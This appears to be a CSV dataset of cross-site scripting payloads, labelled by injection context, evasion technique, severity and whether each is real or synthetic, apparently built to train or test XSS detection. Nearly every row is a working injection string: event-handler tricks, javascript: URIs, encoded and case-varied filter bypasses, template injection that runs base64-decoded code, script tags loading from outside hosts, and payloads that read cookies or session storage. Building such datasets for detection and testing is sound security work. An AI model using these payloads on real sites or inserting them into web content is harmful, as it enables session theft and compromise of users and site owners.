payload,context,technique,severity,length,source
"<style>:target {color:red;}</style><thead id=x style=""transition:color 1s"" ontransitionstart=alert(1)></thead>",event_handler,none,medium,110,real
"<image onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</image>",event_handler,none,medium,69,real
' oNmoUseEntEr=AleRt(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,37,synthetic
"<dir onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</dir>",event_handler,none,medium,63,real
<svg onfocus=prompt(document.cookie)/>,tag_injection,synthetic,medium,38,synthetic
<INPUT TYPE=�IMAGE� SRC=�javascript:alert(�AnonKryptiQuz�);�>,js_uri,case_variation,medium,61,real
<dfn onpointerenter=alert(1) style=display:block>AnonKryptiQuz</dfn>,event_handler,none,medium,68,real
<footer contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,60,real
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,event_handler,none,medium,66,real
<address id=x tabindex=1 onfocusin=alert(1)></address>,event_handler,none,medium,54,real
<video/poster/onerror=alert(1)>,event_handler,none,medium,31,real
<summary onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,69,real
"<applet code=""javascript:confirm(document.cookie);"">",js_uri,none,high,52,real
"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></img>",event_handler,none,medium,160,real
"<style>@keyframes slidein {}</style><hgroup style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></hgroup>",event_handler,none,medium,172,real
%3Csvg ontoggle=confirm(1)%3E,tag_injection,synthetic,medium,29,synthetic
<!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,event_handler,comment_injection,medium,60,real
[LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c),generic,none,medium,95,real
<button popovertarget=x>Click me</button><ins onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</ins>,event_handler,none,medium,102,real
<textarea onchange=alert(1)>AnonKryptiQuz</textarea>,event_handler,none,medium,52,real
"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable style=display:block>drop here</frame>",event_handler,none,medium,127,real
\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e,dom_sink,unicode_escape,medium,86,real
"[][""filter""][""constructor""](""alert(1)"")()",generic,none,medium,41,real
"<style>:target {color: red;}</style><wbr id=x style=""transition:color 10s"" ontransitioncancel=print()></wbr>",event_handler,none,low,108,real
"<u onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</u>",event_handler,none,medium,62,real
"{{constructor.constructor('eval(atob(""YWxlcnQoMSk=""))')()}}",template_injection,encoding,high,59,real
"<b onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</b>",event_handler,none,medium,57,real
<svg ontoggle=alert('XSS')/>,tag_injection,synthetic,medium,28,synthetic
"<set onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,65,real
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,event_handler,none,medium,60,real
""" oNerRor=alErt('XSS') """,attribute_escape,synthetic,medium,24,synthetic
"<style>:target {color:red;}</style><blockquote id=x style=""transition:color 1s"" ontransitionstart=alert(1)></blockquote>",event_handler,none,medium,120,real
"<output onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</output>",event_handler,none,medium,85,real
<BODY ONLOAD=javascript:alert(3213)>,event_handler,case_variation,medium,36,real
"""%3E%3Csvg onbegin=alert(1)%3E",tag_injection,synthetic,medium,30,synthetic
<rb onpointermove=alert(1) style=display:block>AnonKryptiQuz</rb>,event_handler,none,medium,65,real
"<xmp oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",event_handler,none,medium,69,real
' onmouseover=confirm(1) ',attribute_escape,synthetic,medium,26,synthetic
"""><svg onload=alert&quot;#x00000040""1"")>",event_handler,none,low,40,real
<audio controls src=1 onfocus=alert(1) autofocus>,event_handler,none,medium,49,real
"""><svg onbegin=alert(location.hash)>",tag_injection,synthetic,medium,36,synthetic
"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",event_handler,none,medium,113,real
"<svg draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</svg>",event_handler,none,medium,64,real
"""><script src=""https://js.rip/<custom.name>""></script>",script_injection,none,low,54,real
"<tr onmouseup=""alert(1)"">AnonKryptiQuz</tr>",event_handler,none,medium,43,real
<script>/*/prompt('XSS')</script>,script_injection,synthetic,medium,33,synthetic
"<sub onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,79,real
"<script>confirm`String.fromCharCode(88,83,83)`</script>",script_injection,synthetic,medium,55,synthetic
<dd onpointerout=alert(1) style=display:block>AnonKryptiQuz</dd>,event_handler,none,medium,64,real
"<style>:target {transform: rotate(180deg);}</style><input4 id=x style=""transition:transform 2s"" ontransitionrun=print()></input4>",event_handler,none,low,129,real
"%27 onmouseenter=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,63,synthetic
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationend=""alert(1)""></element>",event_handler,none,medium,99,real
&#x00003c,generic,html_entity,low,9,real
"<rp ondblclick=""alert(1)"">AnonKryptiQuz</rp>",event_handler,none,medium,44,real
"""-eval(""window['pro'%2B'mpt'](8)"")-""",dom_sink,encoding|url_encoding,high,36,real
<IMG SRC=`javascript:javascript:alert(9235)`>,js_uri,case_variation,medium,45,real
"<em onmouseout=""alert(1)"">AnonKryptiQuz</em>",event_handler,none,medium,44,real
"<input2 onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</input2>",event_handler,none,medium,74,real
<track onblur=alert(1) tabindex=1 id=x></track><input autofocus>,event_handler,none,medium,64,real
<listing onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
%3Csvg onclick=confirm(location.hash)/%3E,tag_injection,synthetic,medium,41,synthetic
"<style><img src=""</style><img src=x ""><object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",tag_injection,none,low,121,real
"javascript:confirm(String.fromCharCode(88,83,83))",js_uri,synthetic,medium,49,synthetic
"javascript:\/\/\'\/<\/title><\/style><\/textarea><\/script>--><p%22%20%0D%20%0A%20onclick%3Dalert(123)%2F%2F%3E*%2Falert()%2F*%3Cimg%20src%3Dx%20onerror%3Dalert(456)%2F%3E%3Csvg%2Fonload%3Dprompt(789)%2F%3E%3B\'%22%2F%2F%20%3A%3Bfn()%3B%0A%0D%0A%0D%0A%0D%0A%09{{12*12+\'Audi%20RS5\'.substr(0,4)}}XXX%3Cscript%3Ealert(\'AnonKryptiQuz\')",js_uri,url_encoding,medium,335,real
"<svg/onload=window[""al""+""ert""]`1337`>",event_handler,none,low,37,real
“><ScRiPt>alert(document.cookie)</script>,script_injection,case_variation,high,41,real
<iframe autofocus onfocus=alert(1)>,event_handler,none,medium,35,real
"""><svg onlo&#97;d=consol&#101;.log('XSS')>",tag_injection,synthetic,medium,42,synthetic
"<frame oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
%3Csvg onclick=prompt(1)%3E,tag_injection,synthetic,medium,27,synthetic
"<multicol onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</multicol>",event_handler,none,medium,77,real
"<q oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</q>",event_handler,none,medium,65,real
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,event_handler,none,medium,60,real
<del onpointerup=alert(1) style=display:block>AnonKryptiQuz</del>,event_handler,none,medium,65,real
""" onclick=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,45,synthetic
"<kbd onmousemove=""alert(1)"">AnonKryptiQuz</kbd>",event_handler,none,medium,47,real
"<style>:target {transform: rotate(180deg);}</style><script id=x style=""transition:transform 2s"" ontransitionrun=print()></script>",script_injection,none,low,129,real
"<div draggable=""true"" contenteditable>drag me</div><image3 ondragover=alert(1) contenteditable style=display:block>drop here</image3>",event_handler,none,medium,133,real
"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'XSS'\"")`&gt;",generic,html_entity,medium,63,real
"<aside onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</aside>",event_handler,none,medium,70,real
%3Cscript%3Econsole.log(1)%3C/script%3E,script_injection,synthetic,medium,39,synthetic
<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>,event_handler,none,medium,60,real
"<svG oNtoGglE=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,52,synthetic
<details open ontoggle=confirm()>,event_handler,none,medium,33,real
"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable style=display:block>drop here</meta>",event_handler,none,medium,129,real
JavAscRipT:vOid(prOmpT(dOcuMenT.dOmaIn)),js_uri,synthetic,medium,40,synthetic
"<span draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</span>",event_handler,none,medium,61,real
"""%3E%3Csvg onfocus=alert('XSS')%3E",tag_injection,synthetic,medium,34,synthetic
<scr%00ipt>prompt(1)</sc%00ript>,generic,url_encoding,medium,32,real
"<i onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</i>",event_handler,none,medium,59,real
"""><Svg onFocUs=ProMpt(loCatIon.haSh)>",tag_injection,synthetic,medium,37,synthetic
<svg onb&#101;gin=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,51,synthetic
%3C%5K/onpointerenter=alert(1)>,event_handler,url_encoding,medium,31,real
"<?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?>",attribute_escape,url_encoding,medium,271,real
"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",js_uri,case_variation,medium,67,real
<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>,event_handler,none,medium,70,real
%3Csvg onbegin=console.log('XSS')/%3E,tag_injection,synthetic,medium,37,synthetic
<html id=x tabindex=1 onfocus=alert(1)></html>,event_handler,none,medium,46,real
"<link onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</link>",event_handler,none,medium,67,real
"<scr	ipt>alert`String.fromCharCode(88,83,83)`</scr	ipt>",script_injection,synthetic,medium,55,synthetic
<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>,event_handler,none,medium,53,real
}}}</script><script>alert(1)</script>,script_injection,none,medium,37,real
"<image onmouseout=""alert(1)"">AnonKryptiQuz</image>",event_handler,none,medium,50,real
"<spacer oncontextmenu=""alert(1)"">AnonKryptiQuz</spacer>",event_handler,none,medium,55,real
"""><svg onclick=consol&#101;.log(1)>",tag_injection,synthetic,medium,35,synthetic
<figcaption onfocusout=alert(1) tabindex=1 id=x></figcaption><input autofocus>,event_handler,none,medium,78,real
"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,none,medium,83,real
"<html:style /><x xlink:href=""javascript:alert(68)"" xlink:type=""simple"">XXX</x>",js_uri,none,medium,78,real
%3Cscript%3Econsole.log(document.domain)%3C/script%3E,script_injection,synthetic,medium,53,synthetic
"<audio onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</audio>",event_handler,none,medium,66,real
</b><script>alert(document.cookie)</script><b><!--,script_injection,none,high,50,real
""" oNbeGin=coNfiRm(DocUmeNt.CooKie) """,attribute_escape,synthetic,medium,36,synthetic
"%22><svg onbegin=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,54,synthetic
"""%3E%3Csvg onbegin=confirm(document.cookie)%3E",tag_injection,synthetic,medium,46,synthetic
Case: `<script> var new something = '$input'; </script>,script_injection,none,low,55,real
""" onmous&#101;ov&#101;r=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,56,synthetic
<button popovertarget=x>Click me</button><hgroup onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</hgroup>,event_handler,none,medium,108,real
%3Cimg%20src=x%20onerror=alert(1)%3E,event_handler,url_encoding,medium,36,real
' oNfoCus=prOmpT(dOcuMenT.cOokIe) ',attribute_escape,synthetic,medium,35,synthetic
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
<svg onblur=alert(1) tabindex=1 id=x></svg><input autofocus>,event_handler,none,medium,60,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=consol&#101;.log('XSS')>"")",dom_sink,synthetic,medium,76,synthetic
<svG oNclIck=coNsoLe.Log(loCatIon.haSh)>,tag_injection,synthetic,medium,40,synthetic
<br id=x tabindex=1 onfocus=alert(1)></br>,event_handler,none,medium,42,real
"<dd onclick=""alert(1)"">AnonKryptiQuz</dd>",event_handler,none,medium,41,real
""" onfocus=prompt(1) &#97;utofocus=""",attribute_escape,synthetic,medium,35,synthetic
"<input draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</input>",event_handler,none,medium,88,real
"<figure draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</figure>",event_handler,none,medium,70,real
<footer onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
' onerror=prompt('XSS') ',attribute_escape,synthetic,medium,25,synthetic
"<script charset=""\x22>javascript:alert(0624)</script>",script_injection,none,medium,53,real
"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=print()></hgroup>",event_handler,none,low,114,real
"""><script+src=""https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooter&channel=finance&portfolios=true&domain=portfolios&collapsed=1&callback=confirm(9)//jQuery21307555521146732187_1538371213486&_=1538371213487""></script>",script_injection,url_encoding,medium,224,real
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->,script_injection,comment_injection|case_variation,medium,67,real
"<col draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</col>",event_handler,none,medium,64,real
<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>,event_handler,none,medium,64,real
"<rtc onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</rtc>",event_handler,none,medium,62,real
"""%3E%3Csvg onmouseover=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,63,synthetic
<svg onload=confirm()>,event_handler,none,medium,22,real
"<style>@keyframes slidein {}</style><aside style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></aside>",event_handler,none,medium,170,real
"%3Csvg onerror=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,60,synthetic
<body onpointerup=alert(1) style=display:block>AnonKryptiQuz</body>,event_handler,none,medium,67,real
"JavAscRipT:aLerT(STriNg.FroMChArCOde(88,83,83))",js_uri,synthetic,medium,47,synthetic
"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable style=display:block>drop here</ol>",event_handler,none,medium,125,real
"<nav oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",event_handler,none,medium,58,real
&#00039-alert(1)-&#00039,generic,html_entity,medium,24,real
"<section onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</section>",event_handler,none,medium,74,real
"<IMG SRC="" &#14; javascript:alert('AnonKryptiQuz');"">",js_uri,html_entity|case_variation,medium,53,real
<button popovertarget=x>Click me</button><a2 onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</a2>,event_handler,none,medium,100,real
<keygen onpointerleave=alert(1) style=display:block>AnonKryptiQuz</keygen>,event_handler,none,medium,74,real
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,event_handler,none,medium,62,real
<select id=x tabindex=1 onactivate=alert(1)></select>,event_handler,none,medium,53,real
%3Csvg onbegin=prompt(document.cookie)%3E,tag_injection,synthetic,medium,41,synthetic
"<animate oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(4543)"">DEF",js_uri,none,medium,67,real
"<span onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</span>",event_handler,none,medium,67,real
<video onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,67,real
<slot onpointerenter=alert(1) style=display:block>AnonKryptiQuz</slot>,event_handler,none,medium,70,real
"<pre onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",event_handler,none,medium,65,real
<body ontouchmove=alert(1)>,event_handler,none,medium,27,real
